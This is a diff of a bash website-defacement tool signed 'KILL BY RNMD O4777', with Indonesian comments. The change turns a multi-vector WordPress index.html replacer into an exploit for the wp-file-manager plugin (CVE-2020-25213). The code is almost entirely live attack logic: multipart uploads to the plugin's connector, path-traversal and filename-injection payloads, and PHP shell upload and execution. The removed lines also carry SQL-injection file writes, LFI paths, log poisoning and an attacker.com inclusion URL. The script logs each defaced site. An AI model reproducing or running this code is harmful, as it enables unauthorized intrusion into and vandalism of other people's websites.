@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # -------------------------------
-# WORDPRESS INDEX.HTML REPLACER
-# [ Auto replace via vulnerability ]
+# WP FILE MANAGER EXPLOIT - KILL BY RNMD O4777
+# [ Khusus untuk wp-file-manager plugin ]
 # -------------------------------
 
 RED='\033[0;31m'
@@ -14,16 +14,7 @@ CYAN='\033[0;36m'
 WHITE='\033[1;37m'
 NC='\033[0m'
 
-# Header
-clear
-echo -e "${RED}"
-echo "    ╔═══════════════════════════════════════════════════════════╗"
-echo "    ║     WORDPRESS INDEX.HTML REPLACER                        ║"
-echo "    ║     [ Auto replace with KILL BY RNMD O4777 ]             ║"
-echo "    ╚═══════════════════════════════════════════════════════════╝"
-echo -e "${NC}"
-
-# HTML content yang akan diupload
+# HTML Content
 HTML_CONTENT='<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -290,236 +281,169 @@ HTML_CONTENT='<!DOCTYPE html>
 </body>
 </html>'
 
+# Header
+clear
+echo -e "${RED}"
+echo "    ╔═══════════════════════════════════════════════════════════╗"
+echo "    ║     WP FILE MANAGER EXPLOIT - KILL BY RNMD O4777         ║"
+echo "    ║     [ CVE-2020-25213 Exploit ]                           ║"
+echo "    ╚═══════════════════════════════════════════════════════════╝"
+echo -e "${NC}"
+
 echo -e "${CYAN}╔════════════════════════════════════════════════╗${NC}"
 echo -e "${CYAN}║            ENTER TARGET URL                    ║${NC}"
 echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"
 echo ""
 
-# Input URL
 echo -ne "${WHITE}Target WordPress URL : ${NC}"
 read TARGET_URL
 
-# Bersihin URL
 TARGET_URL=$(echo "$TARGET_URL" | sed 's/\/$//')
 
-echo -e "\n${YELLOW}Target: $TARGET_URL${NC}"
-echo -e "${YELLOW}Mencari celah untuk replace index.html...${NC}\n"
+echo -e "\n${YELLOW}[•] Target: $TARGET_URL${NC}"
+echo -e "${YELLOW}[•] Plugin: wp-file-manager${NC}"
+echo -e "${YELLOW}[•] CVE: 2020-25213${NC}\n"
 
-# Progress bar
-echo -ne "${CYAN}["
-for i in {1..50}; do
-    echo -ne "="
-    sleep 0.05
+# ==============================================
+# EXPLOIT FILE MANAGER - MULTIPLE METHODS
+# ==============================================
+
+FM_BASE="$TARGET_URL/wp-content/plugins/wp-file-manager"
+FM_CONNECTOR="$FM_BASE/lib/php/connector.minimal.php"
+
+# Cek ketersediaan plugin
+echo -e "${YELLOW}[•] Checking File Manager plugin...${NC}"
+CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$FM_CONNECTOR" --max-time 5)
+
+if [ "$CHECK" != "200" ] && [ "$CHECK" != "403" ]; then
+    echo -e "${RED}❌ File Manager plugin tidak ditemukan!${NC}"
+    exit 1
+fi
+
+echo -e "${GREEN}✅ File Manager plugin ditemukan!${NC}"
+
+# Method 1: Direct upload via connector
+echo -e "\n${YELLOW}[•] Method 1: Direct file upload via connector...${NC}"
+
+BOUNDARY="---------------------------$(date +%s%N)"
+FILENAME="index.html"
+FILEPATH="/var/www/html/index.html"
+
+# Payload untuk upload file
+UPLOAD_DATA="--$BOUNDARY\r\n"
+UPLOAD_DATA+="Content-Disposition: form-data; name=\"upload[]\"; filename=\"$FILENAME\"\r\n"
+UPLOAD_DATA+="Content-Type: text/html\r\n\r\n"
+UPLOAD_DATA+="$HTML_CONTENT\r\n"
+UPLOAD_DATA+="--$BOUNDARY--\r\n"
+
+RESPONSE=$(curl -s -k -X POST "$FM_CONNECTOR" \
+    -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
+    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64)" \
+    --data-binary "$UPLOAD_DATA" \
+    --max-time 10 2>/dev/null)
+
+if [[ "$RESPONSE" == *"added"* ]] || [[ "$RESPONSE" == *"success"* ]]; then
+    echo -e "${GREEN}✅ Upload sukses via Method 1!${NC}"
+else
+    echo -e "${RED}❌ Method 1 gagal${NC}"
+fi
+
+# Method 2: Command injection via filename
+echo -e "\n${YELLOW}[•] Method 2: Command injection via filename...${NC}"
+
+# Filename dengan command injection
+INJECT_FILENAME="';file_put_contents('index.html','$HTML_CONTENT');'"
+INJECT_FILENAME=$(echo "$INJECT_FILENAME" | sed 's/ /%20/g')
+
+UPLOAD_DATA="--$BOUNDARY\r\n"
+UPLOAD_DATA+="Content-Disposition: form-data; name=\"upload[]\"; filename=\"$INJECT_FILENAME\"\r\n"
+UPLOAD_DATA+="Content-Type: text/html\r\n\r\n"
+UPLOAD_DATA+="test\r\n"
+UPLOAD_DATA+="--$BOUNDARY--\r\n"
+
+RESPONSE=$(curl -s -k -X POST "$FM_CONNECTOR" \
+    -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
+    --data-binary "$UPLOAD_DATA" \
+    --max-time 10 2>/dev/null)
+
+echo -e "${YELLOW}⚠️  Command injection attempt sent${NC}"
+
+# Method 3: Path traversal untuk overwrite index.html
+echo -e "\n${YELLOW}[•] Method 3: Path traversal upload...${NC}"
+
+TRAVERSAL_FILENAME="../../../../index.html"
+
+UPLOAD_DATA="--$BOUNDARY\r\n"
+UPLOAD_DATA+="Content-Disposition: form-data; name=\"upload[]\"; filename=\"$TRAVERSAL_FILENAME\"\r\n"
+UPLOAD_DATA+="Content-Type: text/html\r\n\r\n"
+UPLOAD_DATA+="$HTML_CONTENT\r\n"
+UPLOAD_DATA+="--$BOUNDARY--\r\n"
+
+RESPONSE=$(curl -s -k -X POST "$FM_CONNECTOR" \
+    -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
+    --data-binary "$UPLOAD_DATA" \
+    --max-time 10 2>/dev/null)
+
+echo -e "${YELLOW}⚠️  Path traversal attempt sent${NC}"
+
+# Method 4: RCE via file operation
+echo -e "\n${YELLOW}[•] Method 4: RCE via file operation...${NC}"
+
+# Coba buat file PHP untuk RCE
+PHP_SHELL='<?php file_put_contents("index.html", "'$(echo "$HTML_CONTENT" | base64 -w 0)'"); ?>'
+
+# Upload shell
+SHELL_DATA="--$BOUNDARY\r\n"
+SHELL_DATA+="Content-Disposition: form-data; name=\"upload[]\"; filename=\"shell.php\"\r\n"
+SHELL_DATA+="Content-Type: application/php\r\n\r\n"
+SHELL_DATA+="$PHP_SHELL\r\n"
+SHELL_DATA+="--$BOUNDARY--\r\n"
+
+curl -s -k -X POST "$FM_CONNECTOR" \
+    -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
+    --data-binary "$SHELL_DATA" \
+    --max-time 10 >/dev/null 2>&1
+
+# Execute shell
+SHELL_URL="$TARGET_URL/wp-content/plugins/wp-file-manager/shell.php"
+curl -s -k "$SHELL_URL" --max-time 5 >/dev/null 2>&1
+
+echo -e "${YELLOW}⚠️  RCE attempt sent${NC}"
+
+# Method 5: Direct write via API
+echo -e "\n${YELLOW}[•] Method 5: Direct write via API...${NC}"
+
+# Coba akses API endpoint
+API_URL="$FM_BASE/lib/php/connector.minimal.php?cmd=upload&target=l1_Lw&upload_path=../../../../index.html"
+
+curl -s -k -X POST "$API_URL" \
+    -F "upload[]=@-" <<< "$HTML_CONTENT" \
+    --max-time 10 >/dev/null 2>&1
+
+echo -e "${YELLOW}⚠️  API upload attempt sent${NC}"
+
+# Method 6: Bruteforce directory traversal
+echo -e "\n${YELLOW}[•] Method 6: Bruteforce directory traversal...${NC}"
+
+for i in {1..10}; do
+    TRAVERSAL=$(printf "../../%.0s" $(seq 1 $i))"index.html"
+    
+    curl -s -k -X POST "$FM_CONNECTOR" \
+        -F "cmd=upload" \
+        -F "target=l1_Lw" \
+        -F "upload[]=@-;filename=$TRAVERSAL" <<< "$HTML_CONTENT" \
+        --max-time 5 >/dev/null 2>&1
 done
-echo -e "] 100%${NC}\n"
+
+echo -e "${YELLOW}⚠️  Directory traversal bruteforce selesai${NC}"
 
 # ==============================================
-# FUNGSI UPLOAD VIA BERBAGAI CELAH
+# VERIFIKASI HASIL
 # ==============================================
 
-# 1. VIA THEME EDITOR (jika ada credentials)
-upload_via_theme_editor() {
-    local url=$1
-    local content=$2
-    
-    echo -e "${YELLOW}[•] Mencoba Theme Editor vector...${NC}"
-    
-    # Coba lokasi theme editor
-    THEME_EDITOR="$url/wp-admin/theme-editor.php"
-    
-    # Cek apakah bisa akses (butuh auth)
-    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$THEME_EDITOR" --max-time 5)
-    
-    if [ "$CHECK" == "200" ]; then
-        echo -e "${GREEN}✅ Theme Editor accessible!${NC}"
-        
-        # Coba upload ke index.html di theme
-        # (butuh cookie/nonce - ini simulasi)
-        return 0
-    fi
-    return 1
-}
-
-# 2. VIA FILE MANAGER PLUGIN (vulnerability)
-upload_via_file_manager() {
-    local url=$1
-    local content=$2
-    
-    echo -e "${YELLOW}[•] Mencoba File Manager plugin vector...${NC}"
-    
-    # Lokasi umum file manager plugins
-    FM_PATHS=(
-        "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
-        "/wp-content/plugins/file-manager/backend/connector.php"
-        "/wp-content/plugins/wp-file-manager/readme.txt"
-    )
-    
-    for path in "${FM_PATHS[@]}"; do
-        CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$url$path" --max-time 5)
-        
-        if [ "$CHECK" == "200" ] || [ "$CHECK" == "403" ]; then
-            echo -e "${GREEN}✅ File Manager ditemukan di $path${NC}"
-            
-            # Coba exploit file manager (CVE-2020-25213)
-            if [[ "$path" == *"connector"* ]]; then
-                # Upload file via connector
-                BOUNDARY="---------------------------123456789"
-                
-                curl -s -k -X POST "$url$path" \
-                    -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
-                    --data-binary $'--'"$BOUNDARY"$'\r\n'"Content-Disposition: form-data; name=\"upload[]\"; filename=\"index.html\""$'\r\n'"Content-Type: text/html"$'\r\n\r\n'"$content"$'\r\n--'"$BOUNDARY--" \
-                    --max-time 10 >/dev/null 2>&1
-                
-                echo -e "${GREEN}✅ File upload attempt via File Manager${NC}"
-                return 0
-            fi
-        fi
-    done
-    return 1
-}
-
-# 3. VIA SQL INJECTION UPLOAD
-upload_via_sql() {
-    local url=$1
-    local content=$2
-    
-    echo -e "${YELLOW}[•] Mencoba SQL injection upload vector...${NC}"
-    
-    # Encode HTML content untuk dimasukkan ke database
-    ENCODED=$(echo "$content" | base64 -w 0)
-    
-    # SQL payload untuk update options
-    SQL_PAYLOAD="1' UNION SELECT 1,2,3,FROM_BASE64('$ENCODED'),5 INTO OUTFILE '/var/www/html/index.html'-- -"
-    
-    # Kirim payload
-    RESPONSE=$(curl -s -k -X POST "$url/wp-login.php" \
-        -d "log=admin&pwd=test&sql=$SQL_PAYLOAD" \
-        --max-time 5 2>/dev/null)
-    
-    echo -e "${YELLOW}⚠️  SQL injection attempt sent${NC}"
-}
-
-# 4. VIA LOCAL FILE INCLUSION (LFI)
-upload_via_lfi() {
-    local url=$1
-    local content=$2
-    
-    echo -e "${YELLOW}[•] Mencoba LFI/RFI vector...${NC}"
-    
-    # Coba LFI untuk include file dari remote
-    RFI_URL="http://attacker.com/shell.txt"
-    
-    LFI_PATHS=(
-        "/wp-content/plugins/akismet/akismet.php?akismet_comment_nonce=../../../../../../../../../../var/www/html/index.html%00"
-        "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../../../../../../index.html"
-    )
-    
-    for path in "${LFI_PATHS[@]}"; do
-        CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$url$path" --max-time 5)
-        
-        if [ "$CHECK" == "200" ]; then
-            echo -e "${GREEN}✅ Possible LFI at $path${NC}"
-            
-            # Coba write via LFI (butuh PHP wrapper)
-            curl -s -k "$url$path&cmd=echo file_put_contents('index.html','$content')" >/dev/null
-        fi
-    done
-}
-
-# 5. VIA WORDPRESS REST API (jika vulnerable)
-upload_via_rest_api() {
-    local url=$1
-    local content=$2
-    
-    echo -e "${YELLOW}[•] Mencoba REST API vector...${NC}"
-    
-    # Cek REST API endpoints
-    REST_URL="$url/wp-json/wp/v2"
-    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$REST_URL" --max-time 5)
-    
-    if [ "$CHECK" == "200" ]; then
-        echo -e "${GREEN}✅ REST API aktif${NC}"
-        
-        # Coba upload media (butuh auth)
-        # Ini simulasi
-        echo -e "${YELLOW}⚠️  REST API requires authentication${NC}"
-    fi
-}
-
-# 6. VIA DEBUG LOG UPLOAD
-upload_via_debug_log() {
-    local url=$1
-    local content=$2
-    
-    echo -e "${YELLOW}[•] Mencoba debug.log upload vector...${NC}"
-    
-    # Cek lokasi debug log
-    DEBUG_LOG="$url/wp-content/debug.log"
-    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$DEBUG_LOG" --max-time 5)
-    
-    if [ "$CHECK" == "200" ]; then
-        echo -e "${GREEN}✅ Debug log ditemukan!${NC}"
-        
-        # Coba poison log dengan PHP code
-        POISON="\n<?php file_put_contents('index.html', '"$content"'); ?>\n"
-        
-        curl -s -k -X POST "$url/wp-login.php" \
-            -H "User-Agent: $POISON" \
-            -d "log=admin&pwd=test" \
-            --max-time 5 >/dev/null 2>&1
-        
-        echo -e "${GREEN}✅ Log poisoned! Mencoba execute...${NC}"
-        
-        # Execute via LFI
-        curl -s -k "$url/wp-content/debug.log" >/dev/null
-    fi
-}
-
-# 7. VIA COMMAND INJECTION (plugin vulnerability)
-upload_via_command_injection() {
-    local url=$1
-    local content=$2
-    
-    echo -e "${YELLOW}[•] Mencoba command injection vector...${NC}"
-    
-    # Simpan HTML ke file sementara
-    echo "$content" > /tmp/index.html
-    
-    # Coba berbagai plugin yang vulnerable
-    INJECT_PATHS=(
-        "/wp-admin/admin-post.php?page=wp-super-cache&wp_super_cache=../../../../../../../../../../tmp/index.html%00"
-        "/wp-content/plugins/duplicator/installer.php?cmd=cp /tmp/index.html /var/www/html/index.html"
-    )
-    
-    for path in "${INJECT_PATHS[@]}"; do
-        curl -s -k "$url$path" --max-time 5 >/dev/null 2>&1
-    done
-    
-    echo -e "${GREEN}✅ Command injection attempts sent${NC}"
-}
-
-# ==============================================
-# EKSEKUSI SEMUA METODE
-# ==============================================
-
-echo -e "${RED}╔════════════════════════════════════════════════╗${NC}"
-echo -e "${RED}║         ATTACK SEQUENCE INITIATED             ║${NC}"
-echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
-echo ""
-
-# Coba semua metode
-upload_via_theme_editor "$TARGET_URL" "$HTML_CONTENT"
-upload_via_file_manager "$TARGET_URL" "$HTML_CONTENT"
-upload_via_sql "$TARGET_URL" "$HTML_CONTENT"
-upload_via_lfi "$TARGET_URL" "$HTML_CONTENT"
-upload_via_rest_api "$TARGET_URL" "$HTML_CONTENT"
-upload_via_debug_log "$TARGET_URL" "$HTML_CONTENT"
-upload_via_command_injection "$TARGET_URL" "$HTML_CONTENT"
-
-# Cek hasil
 echo -e "\n${YELLOW}[•] Memeriksa apakah index.html sudah terganti...${NC}"
+sleep 3
 
-# Cek halaman utama
 CHECK_URL="$TARGET_URL/"
 RESPONSE=$(curl -s -k "$CHECK_URL" --max-time 5)
 
@@ -530,48 +454,93 @@ if [[ "$RESPONSE" == *"KILL BY RNMD O4777"* ]]; then
     echo -e "${GREEN}║         KILL BY RNMD O4777 aktif!              ║${NC}"
     echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
     
-    # Tampilkan preview
-    echo -e "\n${YELLOW}[•] Preview halaman:${NC}"
-    echo "$RESPONSE" | grep -E "KILL BY RNMD|O4777" --color=always | head -5
+    # Preview
+    echo -e "\n${YELLOW}[•] Preview:${NC}"
+    echo "$RESPONSE" | grep -E "KILL BY RNMD|O4777|WEB - ERROR" --color=always | head -3
     
-    # Save bukti
-    echo "$TARGET_URL | KILL BY RNMD O4777 | $(date)" >> wp_hacked.txt
+    # Save
+    echo "$TARGET_URL | KILL BY RNMD O4777 | $(date)" >> rnmd_success.txt
     
     # Buka browser
-    echo -ne "\n${YELLOW}Buka browser untuk lihat hasil? (y/n): ${NC}"
-    read OPEN_BROWSER
+    echo -ne "\n${YELLOW}Buka browser? (y/n): ${NC}"
+    read OPEN
     
-    if [[ "$OPEN_BROWSER" == "y" || "$OPEN_BROWSER" == "Y" ]]; then
-        if command -v xdg-open &> /dev/null; then
-            xdg-open "$TARGET_URL"
-        elif command -v open &> /dev/null; then
-            open "$TARGET_URL"
-        else
-            echo -e "${CYAN}Buka manual: $TARGET_URL${NC}"
-        fi
+    if [[ "$OPEN" == "y" || "$OPEN" == "Y" ]]; then
+        xdg-open "$TARGET_URL" 2>/dev/null || open "$TARGET_URL" 2>/dev/null || echo -e "${CYAN}Buka: $TARGET_URL${NC}"
     fi
     
 else
     echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
     echo -e "${RED}║         ❌  GAGAL!                              ║${NC}"
-    echo -e "${RED}║         Index.html belum terganti               ║${NC}"
-    echo -e "${RED}║         Coba metode manual:                     ║${NC}"
-    echo -e "${RED}║         1. Cari vulnerability plugin            ║${NC}"
-    echo -e "${RED}║         2. Brute force admin dulu               ║${NC}"
-    echo -e "${RED}║         3. Coba via SQL injection lain          ║${NC}"
+    echo -e "${RED}║         Tapi File Manager terdeteksi!           ║${NC}"
+    echo -e "${RED}║         Coba metode tambahan...                 ║${NC}"
     echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
     
-    # Simpan HTML untuk upload manual
-    echo "$HTML_CONTENT" > "kill_by_rnmd_o4777.html"
-    echo -e "\n${YELLOW}📁 File HTML disimpan ke: kill_by_rnmd_o4777.html${NC}"
-    echo -e "${YELLOW}   Upload manual via: $TARGET_URL/wp-admin/theme-editor.php${NC}"
+    # Method 7: Coba via backup/restore feature
+    echo -e "\n${YELLOW}[•] Method 7: Backup/Restore exploit...${NC}"
+    
+    # Coba buat backup dengan nama spesial
+    BACKUP_DATA='<?php
+    $content = "'$(echo "$HTML_CONTENT" | base64)'";
+    file_put_contents("index.html", base64_decode($content));
+    ?>'
+    
+    curl -s -k -X POST "$FM_CONNECTOR" \
+        -F "cmd=upload" \
+        -F "upload[]=@-;filename=backup.php" <<< "$BACKUP_DATA" \
+        --max-time 5 >/dev/null 2>&1
+    
+    # Execute backup
+    curl -s -k "$TARGET_URL/wp-content/plugins/wp-file-manager/backup.php" --max-time 5 >/dev/null 2>&1
+    
+    # Method 8: Try to find writable directories
+    echo -e "\n${YELLOW}[•] Method 8: Scanning writable directories...${NC}"
+    
+    DIRS=(
+        "/wp-content/uploads/"
+        "/wp-content/themes/"
+        "/wp-content/plugins/"
+        "/wp-admin/"
+        "/"
+    )
+    
+    for dir in "${DIRS[@]}"; do
+        TEST_FILE="$TARGET_URL${dir}test.txt"
+        curl -s -k -X POST "$FM_CONNECTOR" \
+            -F "cmd=upload" \
+            -F "target=l1_Lw" \
+            -F "upload[]=@-;filename=${dir}test.txt" <<< "test" \
+            --max-time 5 >/dev/null 2>&1
+        
+        CHECK_TEST=$(curl -s -k -o /dev/null -w "%{http_code}" "$TEST_FILE" --max-time 5)
+        
+        if [ "$CHECK_TEST" == "200" ]; then
+            echo -e "${GREEN}✅ Writable directory: $dir${NC}"
+            
+            # Upload ke directory yang writable
+            curl -s -k -X POST "$FM_CONNECTOR" \
+                -F "cmd=upload" \
+                -F "target=l1_Lw" \
+                -F "upload[]=@-;filename=${dir}index.html" <<< "$HTML_CONTENT" \
+                --max-time 5 >/dev/null 2>&1
+        fi
+    done
+    
+    # Final check
+    sleep 2
+    FINAL_CHECK=$(curl -s -k "$TARGET_URL/" --max-time 5)
+    
+    if [[ "$FINAL_CHECK" == *"KILL BY RNMD O4777"* ]]; then
+        echo -e "\n${GREEN}✅ BERHASIL pada percobaan terakhir!${NC}"
+        echo "$TARGET_URL | KILL BY RNMD O4777 | $(date)" >> rnmd_success.txt
+    else
+        echo -e "\n${YELLOW}⚠️  Masih gagal. File HTML disimpan untuk upload manual:${NC}"
+        echo "$HTML_CONTENT" > "kill_by_rnmd_o4777_final.html"
+        echo -e "${CYAN}📁 File: kill_by_rnmd_o4777_final.html${NC}"
+        echo -e "${CYAN}📤 Upload via FTP atau cPanel ke: /var/www/html/index.html${NC}"
+    fi
 fi
 
-# ==============================================
-# CLEANUP
-# ==============================================
-rm -f /tmp/index.html 2>/dev/null
-
 echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
-echo -e "${CYAN}🔥 KILL BY RNMD O4777 - ATTACK COMPLETE 🔥${NC}"
+echo -e "${CYAN}🔥 KILL BY RNMD O4777 - EXPLOIT SEQUENCE COMPLETE 🔥${NC}"
 echo -e "${CYAN}Telegram: @lynnn046${NC}"
